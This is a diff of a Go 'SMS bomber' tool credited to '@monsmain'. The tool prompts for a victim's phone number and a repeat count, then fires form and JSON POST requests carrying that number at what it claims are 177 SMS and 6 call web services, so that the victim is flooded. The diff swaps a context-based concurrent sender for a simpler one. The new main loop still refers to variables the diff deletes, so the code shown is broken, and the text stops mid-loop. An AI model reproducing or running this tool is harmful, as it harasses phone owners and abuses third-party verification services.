@@ -2,22 +2,18 @@ package main
 
 import (
 	"bytes"
-	"context"
 	"encoding/json"
 	"fmt"
-	"io"
 	"net/http"
-	"net/url"
 	"os"
 	"os/exec"
-	"os/signal"
 	"runtime"
-	"strings"
-	"sync"
 	"time"
+	"net/url"
+	"strings"
 )
 
-// Helper function to clear the screen
+
 func clearScreen() {
 	cmd := exec.Command("clear")
 	if runtime.GOOS == "windows" {
@@ -27,172 +23,92 @@ func clearScreen() {
 	cmd.Run()
 }
 
-func sendJSONRequest(ctx context.Context, url string, payload map[string]interface{}, wg *sync.WaitGroup, ch chan<- int) {
-	defer wg.Done()
-
+func sms(url string, payload map[string]interface{}, ch chan<- int) {
 	jsonData, err := json.Marshal(payload)
 	if err != nil {
-		fmt.Println("\033[01;31m[-] Error while encoding JSON for", url, "!\033[0m", err)
-		ch <- 500
+		fmt.Println("\033[01;31m[-] Error while encoding JSON!\033[0m")
+		ch <- http.StatusInternalServerError
 		return
 	}
 
-	req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, bytes.NewBuffer(jsonData))
+	time.Sleep(3 * time.Second)
+
+	resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonData)) // تغییر به application/json
+	time.Sleep(3 * time.Second)
+
 	if err != nil {
-		fmt.Println("\033[01;31m[-] Error while creating request to", url, "!\033[0m", err)
-		ch <- 500
-		return
-	}
-	req.Header.Set("Content-Type", "application/json")
-
-	resp, err := http.DefaultClient.Do(req)
-	if err != nil {
-		if ctx.Err() == context.Canceled {
-			fmt.Println("\033[01;33m[!] Request to", url, "canceled.\033[0m")
-			ch <- 0
-			return
-		}
-		fmt.Printf("\033[01;31m[-] Error while sending request to %s! %v\033[0m\n", url, err)
-
-        if resp != nil {
-             bodyBytes, readErr := io.ReadAll(resp.Body)
-             if readErr != nil {
-                 fmt.Printf("\033[01;31m[-] Failed to read response body for %s: %v\033[0m\n", url, readErr)
-             } else {
-                 fmt.Printf("\033[01;31m[-] Received error status %d for %s. Response Body: %s\033[0m\n", resp.StatusCode, url, string(bodyBytes))
-             }
-        }
-
-		ch <- 500
+		fmt.Println("\033[01;31m[-] Error while sending request to", url, "!", err)
+		ch <- http.StatusInternalServerError
 		return
 	}
 	defer resp.Body.Close()
 
-	statusCode := resp.StatusCode
-	ch <- statusCode
-
-	if statusCode >= 200 && statusCode < 400 {
-
-    } else {
-         bodyBytes, readErr := io.ReadAll(resp.Body)
-         if readErr != nil {
-             fmt.Printf("\033[01;31m[-] Failed to read response body for %s: %v\033[0m\n", url, readErr)
-         } else {
-             fmt.Printf("\033[01;31m[-] Received error status %d for %s. Response Body: %s\033[0m\n", statusCode, url, string(bodyBytes))
-         }
-    }
+	ch <- resp.StatusCode
 }
-
-func sendFormRequest(ctx context.Context, url string, formData url.Values, wg *sync.WaitGroup, ch chan<- int) {
-	defer wg.Done()
-
-	req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, strings.NewReader(formData.Encode()))
-	if err != nil {
-		fmt.Println("\033[01;31m[-] Error while creating form request to", url, "!\033[0m", err)
-		ch <- 500
-		return
-	}
-	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
-
-	resp, err := http.DefaultClient.Do(req)
-	if err != nil {
-		if ctx.Err() == context.Canceled {
-			fmt.Println("\033[01;33m[!] Request to", url, "canceled.\033[0m")
-			ch <- 0
-			return
-		}
-		fmt.Printf("\033[01;31m[-] Error while sending request to %s! %v\033[0m\n", url, err)
-
-        if resp != nil {
-             bodyBytes, readErr := io.ReadAll(resp.Body)
-             if readErr != nil {
-                 fmt.Printf("\033[01;31m[-] Failed to read response body for %s: %v\033[0m\n", url, readErr)
-             } else {
-                 fmt.Printf("\033[01;31m[-] Received error status %d for %s. Response Body: %s\033[0m\n", resp.StatusCode, url, string(bodyBytes))
-             }
-        }
-
-		ch <- 500
-		return
-	}
-	defer resp.Body.Close()
-
-	statusCode := resp.StatusCode
-	ch <- statusCode
-
-	if statusCode >= 200 && statusCode < 400 {
-    } else {
-         bodyBytes, readErr := io.ReadAll(resp.Body)
-         if readErr != nil {
-             fmt.Printf("\033[01;31m[-] Failed to read response body for %s: %v\033[0m\n", url, readErr)
-         } else {
-             fmt.Printf("\033[01;31m[-] Received error status %d for %s. Response Body: %s\033[0m\n", statusCode, url, string(bodyBytes))
-         }
-    }
-}
-
 
 func main() {
 	clearScreen()
 
-	fmt.Print("\033[01;32m")
+	fmt.Print("\033[01;32m") // Top (green)
 	fmt.Print(`
-                                 :-.
-                          .:  =#-:-----:
-                            **%@#%@@@#*+==:
-                        :=*%@@@@@@@@@@@@@@%#*=:
-                     -*%@@@@@@@@@@@@@@@@@@@@@@@%#=.
-                 . -%@@@@@@@@@@@@@@@@@@@@@@@@%%%@@@#:
-               .= *@@@@@@@@@@@@@@@@@@@@@@@@@@@%#*+*%%*.
-              =%.#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+=+#:
-             :%=+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+.+.
-             #@:%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%..
-            .%@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%.
+                                :-.                                   
+                         .:   =#-:-----:                              
+                           **%@#%@@@#*+==:                            
+                       :=*%@@@@@@@@@@@@@@%#*=:                        
+                    -*%@@@@@@@@@@@@@@@@@@@@@@@%#=.                   
+                . -%@@@@@@@@@@@@@@@@@@@@@@@@%%%@@@#:                 
+              .= *@@@@@@@@@@@@@@@@@@@@@@@@@@@%#*+*%%*.               
+             =%.#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+=+#:              
+            :%=+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+.+.             
+            #@:%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%..            
+           .%@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%.            
 `)
-	fmt.Print("\033[01;37m")
+	fmt.Print("\033[01;37m") // Middle (white)
 	fmt.Print(`
-            =@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#
-            +@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:
-            =@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-
-            .%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:
-             #@@@@@@%####**+*%@@@@@@@@@@%*+**####%@@@@@@#
-             -@@@@*:        . -#@@@@@@#: .        -#@@@%:
-              *@@%#            -@@@@@@.           #@@@+
-              .%@@# @monsmain  +@@@@@@=  Sms Bomber #@@#
-               :@@*           =%@@@@@@%-   faster   *@@:
-               #@@%          .*@@@@#%@@@%+.        %@@+
-               %@@@+      -#@@@@@* :%@@@@@*-     *@@@*
+           =@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#            
+           +@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
+           =@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-           
+           .%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
+            #@@@@@@%####**+*%@@@@@@@@@@%*+**####%@@@@@@#            
+            -@@@@*:       .  -#@@@@@@#:  .       -#@@@%:            
+             *@@%#            -@@@@@@.            #@@@+             
+             .%@@# @monsmain  +@@@@@@=  Sms Bomber #@@#              
+              :@@*           =%@@@@@@%-   faster   *@@:              
+              #@@%         .*@@@@#%@@@%+.         %@@+              
+              %@@@+      -#@@@@@* :%@@@@@*-      *@@@*              
 `)
-	fmt.Print("\033[01;31m")
+	fmt.Print("\033[01;31m") // Bottom (red)
 	fmt.Print(`
-               *@@@@#++*#%@@@@@@+    #@@@@@@%#+++%@@@@=
-                #@@@@@@@@@@@@@@* Go   #@@@@@@@@@@@@@@*
-                 =%@@@@@@@@@@@@* :#+ .#@@@@@@@@@@@@#-
-                   .---@@@@@@@@@%@@@%%@@@@@@@@%:--.
-                       #@@@@@@@@@@@@@@@@@@@@@@+
-                        *@@@@@@@@@@@@@@@@@@@@+
-                         +@@%*@@%@@@%%@%*@@%=
-                          +%+ %%.+@%:-@* *%-
-                           . %# .%# %+
-                             :. %+ :.
-                               -:
+              *@@@@#++*#%@@@@@@+    #@@@@@@%#+++%@@@@=              
+               #@@@@@@@@@@@@@@* Go   #@@@@@@@@@@@@@@*               
+                =%@@@@@@@@@@@@* :#+ .#@@@@@@@@@@@@#-                
+                  .---@@@@@@@@@%@@@%%@@@@@@@@%:--.                   
+                      #@@@@@@@@@@@@@@@@@@@@@@+                      
+                       *@@@@@@@@@@@@@@@@@@@@+                       
+                        +@@%*@@%@@@%%@%*@@%=                         
+                         +%+ %%.+@%:-@* *%-                          
+                          .  %# .%#  %+                              
+                             :.  %+  :.                              
+                                 -:                                  
 `)
-	fmt.Print("\033[0m")
+	fmt.Print("\033[0m") // Reset color
 
-
+	var phone string
 	fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSms bomber ! number web service : \033[01;31m177 \n\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mCall bomber ! number web service : \033[01;31m6\n\n")
 	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter phone [Ex : 09xxxxxxxxxx]: \033[00;36m")
-	var phone string
 	fmt.Scan(&phone)
 
 	var repeatCount int
 	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter Number sms/call : \033[00;36m")
 	fmt.Scan(&repeatCount)
 
-    ctx, cancel := context.WithCancel(context.Background())
-    signalChan := make(chan os.Signal, 1)
-	signal.Notify(signalChan, os.Interrupt)
-	go func() {
+	ch := make(chan int)
+
+	for i := 0; i < repeatCount; i++ {
+		formData := url.Values{}
+		formData.Set("cellphone", phone)
+		requestBody := strings.NewReader(formData.Encode())
+		go func() {
 		<-signalChan
 		fmt.Println("\n\033[01;31m[!] Interrupt received. Shutting down...\033[0m\n")
 		cancel()
